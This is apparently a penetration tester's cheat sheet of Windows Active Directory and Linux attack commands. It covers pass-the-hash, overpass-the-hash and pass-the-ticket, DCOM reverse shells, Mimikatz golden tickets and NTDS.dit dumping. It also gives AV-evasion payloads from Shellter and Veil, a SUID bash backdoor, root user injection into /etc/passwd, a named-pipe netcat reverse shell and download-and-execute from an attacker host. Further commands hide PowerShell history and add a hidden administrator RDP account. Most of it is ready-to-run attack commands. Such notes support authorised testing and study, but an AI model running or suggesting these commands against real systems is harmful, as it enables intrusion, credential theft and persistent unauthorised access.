## Lateral Movement in Active Directory
Moving between AD Joined machines can be very powerful in order to execute various tasks. We can use many tools to connect to the machines.

### WMIC
This is deprecated in new Windows versions, and must be Local Admin to run this command, but if we are we can run

```powershell
wmic /node:<NODE-IP> /user:<USER> /password:<PASSWORD> process call create "calc"
```

### WINRS
Windows Remote Shell is command that needs the Domain Admin permission to be executed. WinRM is a built-in for WinRS
```powershell
winrs -r:<NODE-IP> -u:<USER> -p:<PASSWORD>  "cmd /c hostname & whoami"
```

### Powershell WinRM capability
We can use WinRM directly in Powershell with the script

```powershell
$username = '<USERNAME>';
$password = '<PASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName <IP> -Credential $credential
```

We can switch between PS WinRM sessions with

```powershell
Enter-PSSession 1
```

### PsExec
PsExec is a good utility in the [SysInternals suite](https://learn.microsoft.com/en-us/sysinternals/downloads/). To use this we have to be Local Administrators and the ADMIN$ share must be exposed with File and Printer Sharing that has to be turned on. This, in the Windows AD machines is enabled by default. We can run PsExec with the following syntax.

```powershell
./PsExec64.exe -i  \\<MACHINE-IP> -u corp\<USER> -p <PASSWORD> cmd
```

From the kali machine we can use **impacket-psexec** to run commands on Windows AD joined machines

```bash
proxychains impacket-psexec <DOMAIN>/Administrator:'PASSWORD'@<IP>
```

### Pass the hash
If the server has SMB active and the Windows File and Printer Sharing feature to be enabled we can use the previously gained hash to authenticate has another user using only the hash. For this purpose we can use the `impacket-wmiexec` utility in Kali. This will not work in Kerberos authentication but can grant us the access to the system.

```powershell
impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@<IP>
```

### Overpass the hash
We can abuse the hash to gain a full Kerberos TGT to gain then a TGS. To run this attack the credentials has to be cached and this means that in the machine there has to be a session for another user that executed some programs before us. Then we can rely on Mimikatz to get the cached hases. `The core concept of  this attack is to obtain functionant TGT Kerberos ticket without using the NTLM authentication actively over the network.`

```powershell
privilege::debug
sekurlsa::logonpasswords
sekurlsa::pth /user:<USER> /domain:<ORG> /ntlm:<NTLM-HASH> /run:powershell
```
In the new shell we can use

```powershell
net use \\<SMB-SHARE>
klist
```

To list all tickets. If we don't use some authentication before, we will not have any tickets because this is a new session.

We can now use `PsExec` to perform a lateral movement on the user we impersonated before

```powershell
.\PsExec.exe \\files04 cmd
```

**In this way we can convert a NTLM hash in a TGT and we can use tools like PsExec to authenticate in another Windows machine with the TGT ticket. **

### Pass the ticket
If a TGT ticket stays for the machine it was created for, but a TGS can be used in more ways. Here the TGS is reused to authenticate over the network and if the ticket belong to the current user, no Admin privilege is required. Here again we have to gain a pre-existent session in the machine and we have to dump the hases and export them in the directory. This will create some `.kirbi` files that can be reimported for another user.

```powershell
privilege::debug
sekurlsa::tickets /export
```

This is the Mimikatz command to import a ticket inside the current user session

```powershell
kerberos::ptt [0;12bd0]-0-0-xxxxxxxx-<USER>@<SERVICE>-<MACHINE>.kirbi
```

Again with `klist` we can list our new tickets (the new one should appear) and we can use the ticket to enter the service the ticket was for.

### DCOM
The Distributed Component Object Model can be used to perform lateral movement too. This is based on [COM](https://learn.microsoft.com/en-us/windows/win32/com/component-object-model--com--portal?redirectedfrom=MSDN) and is used for inter-communication between computer on a network. DCOM needs RCP on the TCP port 135 to be executed and a local Admin access. It is based on the Microsoft Management Console. We can run a reverse shell with DCOM with

```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","<IP>"))
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"powershell -nop -w hidden -e <REVSHELL-ENCODED>","7")
```

On our attacker computer we must have a netcat listener active

## Active Directory Persistence
After an exploit, to mantain a session once rebooted, changed credentials, etc.. we can craft custom golden tickets.

### Golden Tickets
First we start Mimikatz to dump the NTLM HASH for the `krbtgt` account along with the Domain SID on the **exploited Domain Controller**.

```powershell
privilege::debug
lsadump::lsa /patch
```

Then we purge the credentials and craft the golden ticket for our current user, on the target machine, even if the machine is outside of the domain.

```powershell
kerberos::purge
kerberos::golden /user:<USER> /domain:<DOMAIN> /sid:S-1-5-21-xxxxxx-xxxxx-xxxxx /krbtgt:<HASH> /ptt
misc::cmd
```

Now we have a golden ticket associated with the user session. Once the cmd shell is open we can run with `PsExec` the commands on the Domain Controller using our user that has the golden ticket.

```powershell
PsExec.exe \\dc1 cmd.exe
```

### Shadow Copies
This is a Microsoft's backup technology to perform snapshots of data. The utility is [VShadow Tool and Sample](https://learn.microsoft.com/en-us/windows/win32/vss/vshadow-tool-and-sample). We run the command with

```powershell
vshadow.exe -nw -p  C:
```

We must save the shadow device name to reuse it when we save the backup on the C:\ disk.

```powershell
copy \\?\GLOBALROOT\Device\<NAM>\windows\ntds\ntds.dit c:\ntds.dit.bak
```

As the last thing we save the Windows Registry hive.

```powershell
reg.exe save hklm\system c:\system.bak
```

We can then extract back the data on the Kali machine providing the ntds database and the hive.

```bash
impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
```

# Virus Crafting
A common way to get into the victim's system is to create executables or runnable files that are with the purpose of gaining reverse shells or dumping sensitive informations. It is important to bypass antivirus and file checks. 
A good way to know if the crafted file is malicious or not, and respectively a good way to check if the executable files we downloaded have hidden malicious instructions is to use [VirusTotal](https://www.virustotal.com) or other web analyzers. Typically they check for meaningful fingerprint and they compare them to the most common malicious and know fingerprint found. If one ore more fingerprint is recognized, the file will be flagged as dangerous.

## [Shellter](https://github.com/ParrotSec/shellter)
A famous tool to modify a executable files is Shellter. As the GitHub page says, Shellter is a dynamic shellcode injection tool aka dynamic PE infector. It can be used in order to inject shellcode into native Windows applications (currently 32-bit apps only). The shellcode can be something yours or something generated through a framework, such as Metasploit. Providing a PE file (the executable file format for Windows), like some 32 bit installer, Shellter will inject malicious instruction in order to bind with a reverse shell the victim with the attacker machine, once double clicked. It provides also the `stealth mode` that can try to evade antivirus detection with various tecniques.

## [Veil Framework](https://github.com/Veil-Framework/Veil)
Veil is a Framework that generates metasploit payloads that bypass common anti-virus solutions. It can generate a payloads for many scenarios. 
An example of Veil usage for a simple revshell using a batch file `(.bat)` is the following

```bash
veil -t Evasion -p powershell/meterpreter/rev_tcp.py --ip <IP> --port <PORT>
```

This is binded to the follow meterpreter listener

```bash
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST <LHOST>;set LPORT <LPORT>;run;"
```

# Backdoor
Leaving a backdoor in a system can easily let us come back later and gain immediatly control over the machine. The simplest "root" backdoor on Linux can be done with bash. Just using

```bash
sudo chmod +s /bin/bash
```

Will set the SUID over the bash binary. That means that using

```bash
/bin/bash -p
```

A **root** shell will be gained. The "-p" option preserve the SUID bit. In this way the bash program is called with the owner privileges (root) and if It is not called with "-p" It remains a normal bash shell. Many programs like linpeas.sh or some privesc checker will anyway find this backdoor and report it.

# Reverse Shell VS Bind Shell
What use and when? Typically we use the bind shell in two scenarios. The first is the one in which we already have the access to the machine and we want a persistent access or a backdoor on it. In order to do that we could set a service that binds that port at every boot of the machine. The second scenario is the one in which we are not in the same internal network of the machine and we can't reach our machine from the victim because, for example, we are reaching the victim through web access and to obtain a reverse shell we likely have to enable port forwarding on the router of our networking. In this scenario a bind shell could let the attacker conenct to the victim knowing only the external IP of the victim.

## Reverse Shell
Receiving a command line access to a remote machine, where the victim enstablish the connection to the attacker machine that is the listener.

Once the reverse shell payload is executed on the victim machine, on the attacker the listener will be

```bash
nc -lvnp 4444 -e /bin/bash
```

## Bind Shell
Receiving a command line access to a remote machine, where the victim enstablish the connection to the victim machine that is the listener.

Once the foothold is gained on the victim machine, It can be set up a listener that opens a shell at every connection. After the following conenction is made, we can obtain a shell access on the victim machine. This command is run from the attacker.

```bash
nc <REMOTE-IP> 4444
```


# Shell Stabilization
Once we gain a shell, many times we don't have a fully interactive environment. We can use many tools to stabilize it.

## Netcat
From the kali machine we run the listener

```bash
nc -lvp <PORT>
```

From the Windows machine

```powershell
.\nc.exe <IP> <PORT> -e powershell
```

If we have a linux machine

```powershell
.\nc.exe <IP> <PORT> -e bash
```

## Python3
Checking if the terminal is tty, otherwhise spawn a tty with python3

```bash
tty
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Powercat
We can use Powercat to serve the shell on the listener

```bash
nc -lvp <PORT>
```

```powershell
powercat -l -p <PORT> -e cmd
```   

# Useful Linux Commands
## File Transfer

Mount a SMB share in the system

```bash
sudo mount -t cifs -o 'user=<USERNAME>' //<IP>/share /mnt/share
```

Print permissions over a SMB share for the folder Folder

```bash
smbcacls --no-pass //<IP>/share Folder
```

Make a SMB2 server with name test and credentials.

```bash
impacket-smbserver share .  -smb2support -user user -password password
```
The connection will be done from the Windows client using `\\IP\share` as share location and the credentials.

From the Windows Machine the volume can be mounted with

```powershell
net use H: \\<KALI-IP>\share password /user:user 
```

Transfer files with SSH using a single binary with [pscp](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

```powershell
C:\Users\Public\pscp.exe FILE user@<IP>:C:\Users\Public
```

List all installed packages

```bash
dpgk -l
```

List all disks

```bash
lsblk
```

List all mounts

```bash
mount
```

List all kernel modules

```bash
lsmod
```

Gain information of a module

```bash
modinfo <MODULE>
```

View connections and listening ports

```bash
ss -anp
```

Find writable files in the system

```bash
find / -writable -type d 2>/dev/null
```

Find files with SUID in the system

```bash
find / -perm -u=s -type f 2>/dev/null
```

Add a TCPDUMP listener on lo interface

```bash
 sudo tcpdump -i lo -A | grep "searchword"
 ```

 List sudoer capabilities for a given user

 ```bash
sudo -l
```

List all executed cronjobs

 ```bash
grep "CRON" /var/log/syslog
 ```

Generating a new user in /etc/passwd

 ```bash
openssl passwd <PASSWORD>
echo "<ROOT-USERNAME>:<PASSWORD-HASH>:0:0:root:/root:/bin/bash" >> /etc/passwd
 ```

Get informations of a process

 ```bash
 ps u -C <PROCESS-NAME>
cat /proc/<PID>/status
 ```

Named pipe revshell

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
```

Show git altered files in a git folder

```bash
git log -p
```

Show git diff of a commit

```bash
git diff-tree -p <COMMIT>
```

Recursive cat in a folder and grep for string "password"

```bash
find . -exec cat {} + | grep -i password
```

Download all the resources on a FTP server

```bash
wget -r --user="USERNAME" --password="PASSWORD" ftp://<IP>
```

# Useful Windows Commands
Find a file in the system

```powershell
Get-ChildItem -Path C:\ -Include *.EXTENSION -File -Recurse -ErrorAction SilentlyContinue
```

Filter for a specific extension of a file in the Administrator folder

```powershell
Get-ChildItem -Path C:\Users\Administrator\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.kdbx,*.exe,*.png,*.jpg,*.bin,*.zip,*.bak*,*.md -File -Recurse -ErrorAction SilentlyContinue
```

Find groups of the user Administrator

```powershell
net user Administrator
```

Run a user with another user's identity

```powershell
runas /user:Administrator cmd
```

Find identity of the current user

```powershell
whoami
```

Display the groups of the current user

```powershell
whoami /groups
```

Display the user privileges

```powershell
whoami /priv
```

Get a list of all local users

```powershell
Get-LocalUser
```

Get a list of all local groups

```powershell
Get-LocalGroup
```

Get the list of user for a group

```powershell
Get-LocalGroupMember <GROUPNAME>
```

Gather OS info, CPU info, RAM, BIOS version etc...

```powershell
systeminfo
```

Gather network information such as IP, DNS servers, DHCP info etc...

```powershell
ipconfig /all
```

Display routing table

```powershell
route print
```

List active network connection (**-a** for active TCP connections/UDP ports, **-n** for no name resolution, **-o** for displaying process ID)

```powershell
netstat -ano
```

Get informations of installed applications and filter for useful informations. For 32 bit application we use
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname 
```

And for 64 bit applications

```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

Get the list of running processes

```powershell
Get-Process
```

Get powershell history

```powershell
Get-History
```

If it is used the `Clear-History` command we could retrive the history with `PSReadline`

```powershell
(Get-PSReadlineOption).HistorySavePath
```

In order to prevent also that this history is saved, we must clear the history with

```powershell
Set-PSReadlineOption, -HistorySaveStyle, SaveNothing
```

Run a ps script from RAM

```powershell
iwr -uri http://<ATTACKER-IP>/winPEASx64.exe -Outfile winPEAS.exe
```
or

```powershell
powershell -ep bypass -c "iex(iwr -uri <IP>/script.ps1 -usebasicparsing)"
```

Get a list of the **running** Windows Services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

Show user permissions on a file

```powershell
icacls "C:\path\to\file.exe"
```

Start or stop a service

```powershell
net stop apache2
net start apache2
```

Print all files in a directory

```powershell
Get-ChildItem -Path "C:\Users\diana\Documents" | ForEach-Object { Write-Host "Contents of $($_.Name):"; Get-Content $_.FullName; Write-Host "-------------------------" }
```

Show listening TCP ports

```powershell
netstat -anp TCP | find "<PORT>"
```

Get the list of the domain computers

```powershell
 net view
 ```

View the list of shares in a domain SMB machine

```powershell
 net view \\<COMPUTER-NAME>
```

Recursively copy folder A in folder B

```powershell
Copy-Item C:\path\to\A H:\B -Recurse -Force
```

[Crazywifi's oneliner](https://github.com/crazywifi/Enable-RDP-One-Liner-CMD) for adding user to RDP

```powershell
net user /add (Username) (Password) && net localgroup administrators (Username) /add & net localgroup "Remote Desktop Users" (Username) /add & netsh advfirewall firewall set rule group="remote desktop" new enable=Yes & reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v (Username) /t REG_DWORD /d 0 & reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v TSEnabled /t REG_DWORD /d 1 /f & sc config TermService start= auto
```

Connect via RDP to a machine using password and specific resolution

```powershell
xfreerdp /u:USER /p:'PASSWORD' /v:IP /size:1920x1080
```

# Useful Links
A very useful website that tells you what the given command does in the detail -> https://explainshell.com/
# Dictionary
**LOLBins** used for "Living off the Land" exploits. The attacker uses what he can.

**LOLBAS** Living Off The Land Binaries, Scripts and Libraries https://lolbas-project.github.io/#
